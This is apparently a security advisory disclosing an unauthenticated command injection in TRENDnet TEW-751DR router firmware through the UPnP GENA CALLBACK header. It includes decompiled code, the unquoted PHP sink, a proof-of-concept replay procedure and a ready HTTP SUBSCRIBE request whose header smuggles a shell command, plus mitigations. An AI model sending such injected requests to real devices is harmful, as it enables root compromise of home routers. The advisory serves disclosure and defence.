# TRENDnet TEW-751DR — Unauthenticated Command Injection via the UPnP GENA `CALLBACK` Header

| Field | Value |
|---|---|
| **Product** | TRENDnet TEW-751DR (N600 wireless router); same PHP files in TEW-752DRU and TEW-733GR |
| **Firmware** | 1.03B01 (all three models) |
| **Platform** | MIPS32 little-endian, uClibc; UPnP HTTP service on TCP 49152 |
| **Vulnerability class** | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |
| **Related weakness** | CWE-306 — Missing Authentication for Critical Function (the UPnP control plane is unauthenticated) |
| **CVSS v3.1** | `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` = **7.5 (High)** |
| **Authentication required** | None |
| **Attack vector** | Adjacent network (UPnP service on the LAN) |
| **Impact** | Command execution as **root**, conditional on the device-side timer path (Section 5) |
| **Status** | Confirmed at the script-generation level (vendor `gena.php` generates the script, vendor shell executes it) |
| **CVE ID** | *Requested — VulDB submission pending* |
| **Disclosure** | Public advisory (this repository); earlier copy at https://gist.github.com/qwq-nm/70b4fd27c21fd32e68f929261c01757f |

> **Scope note.** The device-side `phpserver` (PHP interpreter) and the `xmldbc` timer were not
> executed. The NOTIFY shell script is generated by the firmware's **own**
> `htdocs/upnpinc/gena.php` under `php-cli` and executed by the firmware's **own** `/bin/sh`
> inside the extracted rootfs. What is proven is that the generated script contains the
> injected command and that the vendor shell runs it; the `phpserver` → `xmldbc_timer` hop is
> established by decompilation only.
>
> `AC:H` is used because the write path also requires `GENA_notify_init()` to resolve the
> UPnP `INF_UID` node (`XNODE_getpathbytarget(...)`), which depends on the device's `ServerId`
> configuration; when it does not resolve, no script is written. That is an attacker-independent
> condition, not a confidence discount. If it is confirmed to be always set on shipped devices,
> `AC:L` applies → 8.8.

## 1. Summary

`/gena.cgi` is the UPnP event endpoint, reachable at `http://<device>:49152/gena.cgi`.
`genacgi_main` checks only `REQUEST_METHOD` and dispatches `SUBSCRIBE` to
`FUN_0040e740`, without any session or credential check. That function takes the
`CALLBACK` request header, strips the angle brackets and the `http://` prefix, splits
the remainder at the first `/` into `host` and `uri`, and passes both to
`/htdocs/upnp/run.NOTIFY.php`, i.e. to `htdocs/upnpinc/gena.php::GENA_notify_init()`.
That function writes a `#!/bin/sh` script and concatenates the values **without
quoting**:

```php
" -V HDR_URL=".$uri.          // attacker controlled, unquoted
" -V HDR_HOST=".$host.
```

The CGI then schedules the script with
`sprintf("NOTIFY:0:sh %s/%s_%d.sh", "/var/run", service, getpid())` and
`xmldbc_timer(...)`. Because `$uri` becomes an unquoted shell word, a `;` inside the
callback URI terminates the `xmldbc` command and starts an attacker command:

```text
CALLBACK: <http://10.0.0.9/aaa;touch /var/tmp/gena/PWNED;bbb>
  →  -V HDR_URL=aaa;touch /var/tmp/gena/PWNED;bbb
  →  sh executes `touch /var/tmp/gena/PWNED` as root
```

This is a **different** defect from the `/soap.cgi?service=` command injection in the
same firmware: different input (HTTP header vs. query string), different sink
(generated shell script vs. `system()` in the CGI), different code
(`genacgi_main` + `gena.php` vs. `soapcgi_main`).

## 3. Technical details

### 3.1 Entry point

`etc/services/HTTP/httpsvcs.php:135` creates the endpoint at boot:

```php
startcmd("ln -s /htdocs/cgibin ".$vdir."/gena.cgi");
```

`cgibin` dispatches on its basename:

```c
iVar1 = getenv("REQUEST_METHOD");
uVar2 = getenv("REQUEST_URI");
iVar3 = strchr(uVar2, '?');
if (iVar3 && strncmp(iVar3, "?service=", 9) == 0) {
  if (strcasecmp(iVar1, "SUBSCRIBE") == 0)   return FUN_0040e740(iVar3 + 9);
  if (strcasecmp(iVar1, "UNSUBSCRIBE") == 0) return FUN_0040eb2c(iVar3 + 9);
}
return -1;
```

No `sess_ispoweruser()` / `sess_validate()` call — unlike the other eight web CGIs in
the same binary.

### 3.2 Header handling (no escaping)

```c
pcVar2 = getenv("HTTP_CALLBACK");                 /* fully attacker controlled */
if (pcVar2[len-1] == '>') pcVar2[len-1] = '\0';   /* strip trailing '>' */
pcVar2 += (*pcVar2 == '<');                       /* strip leading '<' */
if (strncmp(pcVar2, "http://", 7) != 0) return 412;
puVar5 = strchr(pcVar2 + 7, '/');                 /* first '/' after the host */
*puVar5 = '\0';                                   /* host = pcVar2 + 7 */
sprintf(acStack_228,
  "%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\n"
  "TIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh",
  "/htdocs/upnp/run.NOTIFY.php", server_id, service, pcVar2 + 7, puVar5 + 1,
  timeout, remote_addr, "/var/run", service, getpid());
xmldbc_ephp(0, 0, acStack_228, stdout);           /* phpserver runs run.NOTIFY.php */
sprintf(acStack_228, "NOTIFY:0:sh %s/%s_%d.sh", "/var/run", service, getpid());
xmldbc_timer(0, 0, acStack_228);                  /* the generated script is executed */
```

The `URI=/%s` value is everything after the first `/` of the callback URL, unfiltered:
`;`, `|`, `&`, backticks, `$()` and spaces all pass through.

### 3.3 Script generation

`htdocs/upnpinc/gena.php` (verbatim, `fwrite` with the firmware's 3-argument form):

```php
fwrite(w, $shell_file,
"#!/bin/sh\n".
'echo "[$0] ..." > '.$upnpmsg."\n".
"xmldbc -P ".$target_php.
    " -V INF_UID=".$inf_uid.
    " -V HDR_URL=".$uri.
    " -V HDR_HOST=".$host.
    " -V HDR_SID=".$sid.
    " -V HDR_SEQ=0".
    " | httpc -i ".$phyinf." -d \"".$host."\" -p TCP > ".$upnpmsg."\n"
);
fwrite(a, $shell_file, "rm -f ".$shell_file."\n");
```

Note that `$host` is quoted only in the `-d "…"` argument; `$uri` is not quoted at all.

## 4. Proof of concept

```bash
# 1) generate the NOTIFY script with the vendor's own gena.php, inside the rootfs
python3 poc/gena_replay.py --rootfs <rootfs> --host 10.0.0.9 \
        --uri 'aaa;touch /var/tmp/gena/PWNED;bbb' \
        --outdir <rootfs>/var/tmp/gena/trg

# 2) execute it with the firmware's own shell (path is inside the rootfs)
sudo chroot <rootfs> /bin/sh /var/tmp/gena/trg/WANIPConn1_1.sh
```

`poc/replay_gena_callback.sh` does both steps for a control URI (`aaa`) and a trigger
URI (`aaa;touch …;bbb`), and prints the `HDR_URL` line of each generated script. The
only variable is the URI segment.

Observed:

| Run | `CALLBACK` | Generated `HDR_URL` | `/var/tmp/gena/PWNED` |
|---|---|---|---|
| Control | `<http://10.0.0.9/aaa>` | `-V HDR_URL=aaa` | absent |
| Trigger | `<http://10.0.0.9/aaa;touch /var/tmp/gena/PWNED;bbb>` | `-V HDR_URL=aaa;touch /var/tmp/gena/PWNED;bbb` | **present**, `root:root`, 0 bytes |

The request that reaches the device is:

```http
SUBSCRIBE /gena.cgi?service=WANIPConn1 HTTP/1.1
Host: 192.168.10.1:49152
NT: upnp:event
TIMEOUT: Second-1800
CALLBACK: <http://10.0.0.9/aaa;touch /var/tmp/gena/PWNED;bbb>
```

In the emulation `xmldbc` and `httpc` are absent, so the shell reports
`xmldbc: not found` / `bbb: not found`; the injected `touch` still runs. On the device
both binaries exist, so the injected segment executes with the rest of the line.

## 5. Impact

- **Conditional** root command execution on the LAN side: the command is injected into a
  script that the CGI schedules for execution by the UPnP timer. The script content and
  the shell behaviour are proven; the timer actually firing is established statically
  (Section 3.2), not observed. This is why `AC:H` is used and why the impact is
  described as conditional.
- Anyone who can send an HTTP request to TCP 49152 can reach the endpoint; the UPnP
  service is enabled by default on these models.
- The `CALLBACK` header is a different input from the query string, so filtering that
  only inspects `service=` does not stop this variant.

## 6. Existing CVEs and differences

No public advisory was located for the `CALLBACK` → `gena.php` path on the
TEW-751DR/752DRU/733GR (search date 2026-11-03). The `/soap.cgi?service=` injection in
the same firmware is a distinct defect and is reported separately. UPnP/GENA issues in
other vendors' stacks do not share this code, and this report does not claim they do.

## 7. Mitigation

- Whitelist `service` against existing `ACTION.<name>.php` files and reject anything else.
- Quote or escape `$uri` / `$host` in `gena.php` (`escapeshellarg()`), or stop
  generating shell scripts from HTTP headers and call the notifier directly.
- Do not rely on `system()` / generated scripts for request handling; pass argv arrays.
- Disable the UPnP control plane when it is not needed, and restrict it to the LAN.

## 9. Notes on scope and integrity of the report

- Not end-to-end: `phpserver` and `xmldbc_timer` were not executed. The generated
  script, the vendor shell behaviour and the created file are real.
- Not verified on physical hardware; WAN-side exposure was not tested and is not claimed.
- `TEW-752DRU` carries the same PHP files (identical hashes) but a different `cgibin`;
  the branch was decompiled separately and matches. It is **not** claimed as reproduced
  on 752DRU.
- The test artifacts contain no personal name, e-mail address, phone number or machine
  identifier. The disclosure URLs point to a project account, not to a personal identity.
- No credential, persistence mechanism or turnkey payload is published; the PoC only
  creates an empty marker file.
